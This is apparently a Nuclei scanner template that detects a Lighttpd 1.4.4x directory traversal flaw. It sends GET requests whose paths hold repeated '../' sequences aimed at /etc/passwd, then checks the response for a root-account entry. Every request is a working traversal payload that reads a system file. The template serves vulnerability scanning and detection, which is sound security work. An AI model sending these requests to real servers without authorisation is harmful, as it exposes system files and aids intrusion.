id: lighttpd-lfi

info:
  name: Lighttpd - Directory Traversal (v1.4.4x)
  author: philippedelteil
  severity: medium
  description: Directory traversal vulnerability on Lighttpd v1.4.4x
  #add reference

requests:
  - method: GET
    path:
      - '{{BaseURL}}/./../../../../../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/../../../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../../etc/passwd'
      - '{{BaseURL}}/./../../../../etc/passwd'
      - '{{BaseURL}}/./../../../etc/passwd'
      - '{{BaseURL}}/./../../etc/passwd'
      - '{{BaseURL}}/./../etc/passwd'
    matchers-condition: and
    matchers:
     # - type: status
     #   status:
     #     - 200
      - type: regex
        regex:
          - "root:[x*]:0:0"
        part: body
